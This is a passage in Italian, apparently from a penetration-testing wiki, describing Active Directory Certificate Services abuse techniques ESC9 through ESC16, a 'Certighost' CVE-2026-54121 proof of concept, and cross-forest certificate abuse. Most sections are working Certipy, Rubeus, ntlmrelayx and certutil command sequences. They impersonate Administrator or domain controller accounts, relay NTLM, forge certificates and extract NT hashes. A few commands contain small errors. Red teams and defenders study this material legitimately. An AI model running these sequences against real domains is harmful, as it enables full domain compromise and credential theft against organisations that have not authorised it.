Il nuovo valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) per **`msPKI-Enrollment-Flag`**, indicato come ESC9, impedisce l'inclusione della **nuova estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`** in un certificato. Questo flag diventa rilevante quando `StrongCertificateBindingEnforcement` è impostato su `1` (impostazione predefinita), in contrasto con l'impostazione `2`. La sua rilevanza aumenta negli scenari in cui potrebbe essere sfruttato un mapping dei certificati più debole per Kerberos o Schannel (come in ESC10), poiché l'assenza di ESC9 non modificherebbe i requisiti.<sup>[[7]](#references)</sup>

Le condizioni in cui l'impostazione di questo flag diventa significativa includono:

- `StrongCertificateBindingEnforcement` non è impostato su `2` (il valore predefinito è `1`), oppure `CertificateMappingMethods` include il flag `UPN`.
- Il certificato è contrassegnato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.
- Nel certificato è specificato un EKU per l'autenticazione client.
- Sono disponibili permessi `GenericWrite` su un account qualsiasi, così da compromettere un altro account.

### Scenario di abuso

Supponiamo che `John@corp.local` disponga di permessi `GenericWrite` su `Jane@corp.local`, con l'obiettivo di compromettere `Administrator@corp.local`. Il template di certificato `ESC9`, al quale `Jane@corp.local` è autorizzata ad eseguire l'enrollment, è configurato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.

Inizialmente, l'hash di `Jane` viene ottenuto utilizzando Shadow Credentials, grazie al `GenericWrite` di `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo intenzionalmente la parte di dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Questa modifica non viola i vincoli, dato che `Administrator@corp.local` rimane distinto dal `userPrincipalName` di `Administrator`.

In seguito a ciò, il template di certificato `ESC9`, contrassegnato come vulnerabile, viene richiesto come `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
È stato notato che il `userPrincipalName` del certificato riflette `Administrator`, privo di qualsiasi “object SID”.

Il `userPrincipalName` di `Jane` viene quindi ripristinato all'originale, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Il tentativo di autenticazione con il certificato emesso restituisce ora l'hash NT di `Administrator@corp.local`. Il comando deve includere `-domain <domain>` a causa dell'assenza della specifica del dominio nel certificato:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Mappature deboli dei certificati - ESC10

### Spiegazione

Due valori delle chiavi di registro sul domain controller sono indicati da ESC10:

- Il valore predefinito di `CertificateMappingMethods` in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` è `0x18` (`0x8 | 0x10`), precedentemente impostato su `0x1F`.
- L'impostazione predefinita di `StrongCertificateBindingEnforcement` in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` è `1`, precedentemente `0`.<sup>[[7]](#references)</sup>

**Caso 1**

Quando `StrongCertificateBindingEnforcement` è configurato su `0`.

**Caso 2**

Se `CertificateMappingMethods` include il bit `UPN` (`0x4`).

### Caso di abuso 1

Con `StrongCertificateBindingEnforcement` configurato su `0`, un account A con permessi `GenericWrite` può essere sfruttato per compromettere qualsiasi account B.

Ad esempio, disponendo di permessi `GenericWrite` su `Jane@corp.local`, un attacker mira a compromettere `Administrator@corp.local`. La procedura rispecchia ESC9, consentendo di utilizzare qualsiasi certificate template.

Inizialmente, l'hash di `Jane` viene recuperato utilizzando Shadow Credentials, sfruttando `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione del vincolo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
In seguito a ciò, viene richiesto come `Jane` un certificato che abilita l'autenticazione client, utilizzando il template predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene quindi ripristinato al valore originale, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L'autenticazione con il certificato ottenuto restituirà l'hash NT di `Administrator@corp.local`, rendendo necessario specificare il dominio nel comando poiché il certificato non contiene informazioni sul dominio.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso di abuso 2

Con `CertificateMappingMethods` contenente il flag di bit `UPN` (`0x4`), un account A con autorizzazioni `GenericWrite` può compromettere qualsiasi account B privo della proprietà `userPrincipalName`, inclusi gli account macchina e l'amministratore di dominio integrato `Administrator`.

In questo caso, l'obiettivo è compromettere `DC$@corp.local`, iniziando dall'ottenimento dell'hash di `Jane` tramite Shadow Credentials e sfruttando `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Il `userPrincipalName` di `Jane` viene quindi impostato su `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Viene richiesto un certificato per l'autenticazione client come `Jane` utilizzando il template predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene ripristinato al valore originale dopo questo processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Per autenticarsi tramite Schannel, viene utilizzata l’opzione `-ldap-shell` di Certipy, a indicare che l’autenticazione è riuscita come `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Attraverso la shell LDAP, comandi come `set_rbcd` consentono attacchi di Resource-Based Constrained Delegation (RBCD), compromettendo potenzialmente il controller di dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Questa vulnerabilità si estende anche a qualsiasi account utente privo di `userPrincipalName` o per il quale questo non corrisponda a `sAMAccountName`, con l'account predefinito `Administrator@corp.local` che rappresenta un obiettivo privilegiato a causa dei suoi privilegi LDAP elevati e dell'assenza di un `userPrincipalName` per impostazione predefinita.

## Relaying NTLM to ICPR - ESC11

### Spiegazione

Se il CA Server non è configurato con `IF_ENFORCEENCRYPTICERTREQUEST`, è possibile eseguire attacchi NTLM relay senza signing tramite il servizio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

È possibile utilizzare `certipy` per enumerare se `Enforce Encryption for Requests` è Disabled; certipy mostrerà quindi le Vulnerabilità `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario di abuso

È necessario configurare un relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: per i domain controller, dobbiamo specificare `-template` in DomainController.

Oppure usando il [fork di impacket di sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Accesso shell alla CA ADCS con YubiHSM - ESC12

### Spiegazione

Gli amministratori possono configurare la Certificate Authority per archiviarla su un dispositivo esterno come "Yubico YubiHSM2".

Se il dispositivo USB è connesso al server CA tramite una porta USB, oppure tramite un USB device server nel caso in cui il server CA sia una macchina virtuale, è necessaria una chiave di autenticazione (talvolta indicata come "password") affinché il Key Storage Provider possa generare e utilizzare le chiavi nello YubiHSM.

Questa chiave/password è archiviata nel registro alla voce `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in formato cleartext.

Riferimento [qui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario di abuso

Se la chiave privata della CA è archiviata su un dispositivo USB fisico e si ottiene shell access, è possibile recuperare la chiave.

Per prima cosa, è necessario ottenere il certificato della CA (è pubblico) e quindi:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Infine, usa il comando `-sign` di certutil per falsificare un nuovo certificato arbitrario utilizzando il certificato della CA e la relativa chiave privata.

## OID Group Link Abuse - ESC13

### Spiegazione

L'attributo `msPKI-Certificate-Policy` consente di aggiungere la policy di emissione al certificate template. Gli oggetti `msPKI-Enterprise-Oid`, responsabili delle policy di emissione, possono essere individuati nel Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) del container PKI OID. Una policy può essere collegata a un gruppo AD tramite l'attributo `msDS-OIDToGroupLink` di questo oggetto, consentendo a un sistema di autorizzare un utente che presenta il certificato come se fosse membro del gruppo. [Riferimento qui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

In altre parole, quando un utente dispone dell'autorizzazione per effettuare l'enrollment di un certificato e il certificato è collegato a un gruppo OID, l'utente può ereditare i privilegi di questo gruppo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) per trovare OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario di abuso

Trova un'autorizzazione utente che può essere utilizzata con `certipy find` o `Certify.exe find /showAllPermissions`.

Se `John` dispone dell'autorizzazione per eseguire l'enrollment di `VulnerableTemplate`, l'utente può ereditare i privilegi del gruppo `VulnerableGroup`.

È sufficiente specificare il template per ottenere un certificato con i diritti `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configurazione vulnerabile del rinnovo dei certificati - ESC14

### Spiegazione

La descrizione disponibile all'indirizzo https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping è straordinariamente dettagliata. Di seguito è riportata una citazione del testo originale.<sup>[[14]](#references)</sup>

ESC14 riguarda le vulnerabilità derivanti dal "weak explicit certificate mapping", principalmente dovute all'uso improprio o alla configurazione non sicura dell'attributo `altSecurityIdentities` sugli account utente o computer di Active Directory. Questo attributo multivalore consente agli amministratori di associare manualmente certificati X.509 a un account AD per scopi di autenticazione. Quando vengono popolati, questi mapping espliciti possono sovrascrivere la logica predefinita di certificate mapping, che normalmente si basa sugli UPN o sui nomi DNS nel SAN del certificato, oppure sul SID incorporato nell'estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`.

Un mapping "weak" si verifica quando il valore stringa utilizzato nell'attributo `altSecurityIdentities` per identificare un certificato è troppo ampio, facilmente prevedibile, si basa su campi del certificato non univoci o utilizza componenti del certificato facilmente falsificabili. Se un attacker riesce a ottenere o creare un certificato i cui attributi corrispondono a un mapping esplicito debole per un account privilegiato, può utilizzare quel certificato per autenticarsi come tale account e impersonarlo.

Esempi di stringhe di mapping `altSecurityIdentities` potenzialmente deboli includono:

- Mapping basato esclusivamente su un Subject Common Name (CN) comune: ad esempio, `X509:<S>CN=SomeUser`. Un attacker potrebbe riuscire a ottenere un certificato con questo CN da una fonte meno sicura.
- Utilizzo di Issuer Distinguished Name (DN) o Subject DN eccessivamente generici, senza ulteriori qualificatori come un numero di serie specifico o un subject key identifier: ad esempio, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Impiego di altri pattern prevedibili o identificatori non crittografici che un attacker potrebbe riuscire a soddisfare in un certificato che può ottenere legittimamente o falsificare (se ha compromesso una CA o ha trovato un template vulnerabile come in ESC1).

L'attributo `altSecurityIdentities` supporta diversi formati per il mapping, come:

- `X509:<I>IssuerDN<S>SubjectDN` (esegue il mapping tramite Issuer e Subject DN completi)
- `X509:<SKI>SubjectKeyIdentifier` (esegue il mapping tramite il valore dell'estensione Subject Key Identifier del certificato)
- `X509:<SR>SerialNumberBackedByIssuerDN` (esegue il mapping tramite il numero di serie, qualificato implicitamente dall'Issuer DN) - questo non è un formato standard; solitamente è `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (esegue il mapping tramite un nome RFC822, solitamente un indirizzo email, dal SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (esegue il mapping tramite un hash SHA1 della raw public key del certificato - generalmente strong)

La sicurezza di questi mapping dipende fortemente dalla specificità, dall'unicità e dalla robustezza crittografica degli identificatori del certificato scelti nella stringa di mapping. Anche con modalità di strong certificate binding abilitate sui Domain Controller (che influiscono principalmente sui mapping impliciti basati sugli UPN/DNS del SAN e sull'estensione SID), una voce `altSecurityIdentities` configurata in modo errato può comunque rappresentare un percorso diretto per l'impersonation se la logica di mapping è difettosa o eccessivamente permissiva.
### Scenario di abuso

ESC14 prende di mira gli **explicit certificate mappings** in Active Directory (AD), in particolare l'attributo `altSecurityIdentities`. Se questo attributo è impostato (intenzionalmente o a causa di una configurazione errata), gli attacker possono impersonare gli account presentando certificati che corrispondono al mapping.

#### Scenario A: l'attacker può scrivere in `altSecurityIdentities`

**Precondizione**: l'attacker dispone dei permessi di scrittura sull'attributo `altSecurityIdentities` dell'account target oppure del permesso di concederlo tramite uno dei seguenti permessi sull'oggetto AD target:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: il target ha un mapping debole tramite X509RFC822 (Email)

- **Precondizione**: il target dispone di un mapping X509RFC822 debole in altSecurityIdentities. Un attacker può impostare l'attributo mail della vittima affinché corrisponda al nome X509RFC822 del target, effettuare l'enrollment di un certificato come la vittima e utilizzarlo per autenticarsi come il target.
#### Scenario C: il target ha un mapping X509IssuerSubject

- **Precondizione**: il target dispone di un mapping esplicito X509IssuerSubject debole in `altSecurityIdentities`.L'attacker può impostare l'attributo `cn` o `dNSHostName` su un principal vittima affinché corrisponda al subject del mapping X509IssuerSubject del target. Quindi l'attacker può effettuare l'enrollment di un certificato come la vittima e utilizzare questo certificato per autenticarsi come il target.
#### Scenario D: il target ha un mapping X509SubjectOnly

- **Precondizione**: il target dispone di un mapping esplicito X509SubjectOnly debole in `altSecurityIdentities`. L'attacker può impostare l'attributo `cn` o `dNSHostName` su un principal vittima affinché corrisponda al subject del mapping X509SubjectOnly del target. Quindi l'attacker può effettuare l'enrollment di un certificato come la vittima e utilizzare questo certificato per autenticarsi come il target.
### operazioni concrete
#### Scenario A

Richiedere un certificato del certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Salva e converti il certificato
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticarsi (utilizzando il certificato)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Pulizia (facoltativa)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Per metodi di attacco più specifici in vari scenari di attacco, fare riferimento a quanto segue: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Spiegazione

La descrizione disponibile all'indirizzo https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc è straordinariamente dettagliata. Di seguito è riportata una citazione del testo originale.<sup>[[15]](#references)</sup>

Utilizzando i modelli di certificato predefiniti integrati di versione 1, un attacker può creare un CSR includendo application policies che hanno la precedenza sugli attributi Extended Key Usage configurati e specificati nel template. L'unico requisito è disporre dei diritti di enrollment, e questa tecnica può essere utilizzata per generare certificati di autenticazione client, certificate request agent e codesigning utilizzando il template **_WebServer_**

### Abuse

La [documentazione di privilege-escalation di Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contiene esempi di utilizzo più dettagliati.<sup>[[14]](#references)</sup>


Il comando `find` di Certipy può aiutare a identificare i template V1 potenzialmente vulnerabili a ESC15 se la CA non è stata patchata.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Impersonazione diretta tramite Schannel

**Passaggio 1: Richiedere un certificato, iniettando la policy applicativa "Client Authentication" e l'UPN target.** L'attacker `attacker@corp.local` prende di mira `administrator@corp.local` utilizzando il template "WebServer" V1 (che consente al richiedente di specificare il subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Il template V1 vulnerabile con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inserisce l'OID `1.3.6.1.5.5.7.3.2` nell'estensione Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Imposta l'UPN nel SAN per l'impersonificazione.

**Step 2: Autenticarsi tramite Schannel (LDAPS) utilizzando il certificato ottenuto.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation tramite abuso di Enrollment Agent

**Step 1: Richiedere un certificate da un template V1 (con "Enrollee supplies subject"), iniettando la Application Policy "Certificate Request Agent".** Questo certificate serve all'attacker (`attacker@corp.local`) per diventare un enrollment agent. Non viene specificato alcun UPN per l'identità dell'attacker, poiché l'obiettivo è ottenere la capacità di agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Passo 2: Usa il certificato "agent" per richiedere un certificato per conto di un utente privilegiato target.** Questo è un passaggio simile a ESC3, che utilizza il certificato del Passo 1 come certificato agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Passaggio 3: autenticati come utente privilegiato utilizzando il certificato "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Spiegazione

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** si riferisce allo scenario in cui, se la configurazione di AD CS non impone l'inclusione dell'estensione **szOID_NTDS_CA_SECURITY_EXT** in tutti i certificati, un attacker può sfruttare questa situazione per:

1. Richiedere un certificato **senza SID binding**.

2. Utilizzare questo certificato **per l'autenticazione come qualsiasi account**, ad esempio impersonando un account con privilegi elevati (come un Domain Administrator).

Puoi anche consultare questo articolo per saperne di più sul principio dettagliato:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuso

Quanto segue fa riferimento a [questo link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), fai clic per visualizzare metodi di utilizzo più dettagliati.<sup>[[14]](#references)</sup>

Per identificare se l'ambiente Active Directory Certificate Services (AD CS) è vulnerabile a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Passaggio 1: Leggi l'UPN iniziale dell'account vittima (Facoltativo - per il ripristino).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Passaggio 2: Aggiorna l'UPN dell'account vittima con il `sAMAccountName` dell'amministratore di destinazione.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Passaggio 3: (se necessario) Ottenere le credenziali dell'account "vittima" (ad esempio, tramite Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Passaggio 4: Richiedi un certificato come utente "victim" da _qualsiasi template di autenticazione client appropriato_ (ad es., "User") sulla CA vulnerabile a ESC16.** Poiché la CA è vulnerabile a ESC16, ometterà automaticamente l'estensione di sicurezza SID dal certificato emesso, indipendentemente dalle impostazioni specifiche del template per questa estensione. Imposta la variabile d'ambiente della cache delle credenziali Kerberos (comando shell):
```bash
export KRB5CCNAME=victim.ccache
```
Quindi richiedi il certificato:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Passaggio 5: Ripristina l'UPN dell'account "vittima".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Passaggio 6: Autenticati come amministratore di destinazione.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Sostituzione dell'identità nel callback chase Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Spiegazione

**Certighost** abusa di un **percorso di enrollment chase / callback di AD CS** in cui la CA si fida degli attributi della richiesta forniti dal richiedente per risolvere l'identità da inserire nel certificato emesso. Nel PoC pubblico, la richiesta appositamente creata include:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controllato dall'attaccante che la CA contatterà
- **`rmd`**: **nome DNS del Domain Controller target** da impersonare

Se la CA segue questo chase, si connetterà all'attaccante tramite **SMB/LSA (`445`)** e **LDAP (`389`)**. L'attaccante utilizza un **account computer reale** (solitamente creato tramite la **`ms-DS-MachineAccountQuota`** predefinita), in modo che la sessione callback esegua l'autenticazione come principal di dominio valido, ma i servizi rogue restituiscono invece gli attributi di identità del **DC target**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Se la CA **non associa crittograficamente l'identità restituita al principal callback autenticato**, può emettere un certificato per il **Domain Controller**, anche se la sessione si è autenticata utilizzando l'account computer controllato dall'attaccante. Questo rende il bug concettualmente diverso da **Certifried**: invece di riscrivere attributi AD come `dNSHostName`, l'attaccante **sostituisce i dati di identità durante la risoluzione del callback della CA**.<sup>[[2]](#references)</sup>

**Prerequisiti utili:**

- **Credenziali di dominio** con pochi privilegi
- Possibilità di **creare o riutilizzare un account computer**
- Raggiungibilità di rete dalla **CA** verso le **porte `389` e `445`** controllate dall'attaccante
- Percorso di richiesta della CA vulnerabile / senza patch (l'aggiornamento Microsoft del **14 luglio 2026** ha aggiunto la **validazione del DC per `cdc`** e un **confronto del SID risolto**)

Il file **`.pfx`** risultante può quindi essere utilizzato per **PKINIT**, producendo un **`.ccache`** e, nel flusso del PoC pubblicato, l'**NT hash del DC target**, normalmente sufficiente per una **compromissione completa del dominio**.

### Abuso

Il PoC pubblico automatizza l'intera catena:<sup>[[1]](#references)</sup>

1. Creare o riutilizzare un **account computer** controllato dall'attaccante.
2. Avviare **listener LDAP e SMB/LSA rogue** sulle porte `389` e `445`.
3. Inviare una richiesta di certificato contenente gli attributi **`cdc`** controllati dall'attaccante e **`rmd`** del target.
4. Consentire alla CA di autenticarsi ai listener rogue utilizzando l'account computer controllato, rispondendo però alle ricerche dell'identità con gli attributi del **DC target**.
5. Ricevere un **certificato del DC** firmato dalla CA e utilizzarlo quindi per **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Flag utili a runtime dal PoC:

- `--listener <ip>`: seleziona esplicitamente l'IP di callback pubblicizzato in `cdc`
- `--computer-name <NAME$>`: riutilizza un account computer esistente invece di crearne uno nuovo

**Note operative:**

- Il PoC richiede **root** perché effettua il bind sulle **porte privilegiate** `389` e `445`.
- Un'exploitation riuscito scrive localmente un **DC `.pfx`** e un **Kerberos `.ccache`**.
- Poiché il certificato esegue il mapping a un **account Domain Controller**, le azioni successive possono includere **Kerberos auth basata su certificato**, **DCSync** e il riutilizzo del **machine NT hash** recuperato.<sup>[[2]](#references)</sup>

## Compromissione delle foreste con certificati spiegata in voce passiva

### Violazione dei trust tra foreste tramite CA compromesse

La configurazione per l'**enrollment cross-forest** viene resa relativamente semplice. Il certificato della **root CA** della resource forest viene **pubblicato nelle account forest** dagli amministratori, mentre i certificati della **enterprise CA** della resource forest vengono **aggiunti ai container `NTAuthCertificates` e AIA in ogni account forest**. Per chiarire, questa configurazione conferisce alla **CA nella resource forest il controllo completo** su tutte le altre foreste per le quali gestisce la PKI. Qualora questa CA venisse **compromessa dagli attacker**, i certificati per tutti gli utenti sia nella resource forest sia nelle account forest potrebbero essere **forgiati da loro**, violando così il confine di sicurezza della foresta.<sup>[[6]](#references)</sup>

### Privilegi di enrollment concessi a principal esterni

Negli ambienti multi-forest è necessario prestare attenzione alle Enterprise CA che **pubblicano certificate template** che consentono agli **Authenticated Users o ai foreign principal** (utenti/gruppi esterni alla foresta a cui appartiene la Enterprise CA) di ottenere **diritti di enrollment e modifica**.\
Dopo l'autenticazione attraverso un trust, l'**Authenticated Users SID** viene aggiunto da AD al token dell'utente. Pertanto, se un dominio possiede una Enterprise CA con un template che **consente agli Authenticated Users i diritti di enrollment**, un template potrebbe potenzialmente essere **utilizzato per l'enrollment da un utente di un'altra foresta**. Analogamente, se i **diritti di enrollment vengono concessi esplicitamente a un foreign principal da un template**, viene così creata una **relazione di controllo degli accessi cross-forest**, che consente a un principal di una foresta di **effettuare l'enrollment in un template di un'altra foresta**.

Entrambi gli scenari comportano un **aumento della attack surface** da una foresta all'altra. Le impostazioni del certificate template potrebbero essere sfruttate da un attacker per ottenere privilegi aggiuntivi in un dominio esterno.<sup>[[6]](#references)</sup>


## References

- [1] [repository PoC di aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - analisi tecnica di Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog di SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abuso dei servizi certificati di Active Directory](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nuovi metodi di autenticazione e richiesta e altro](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
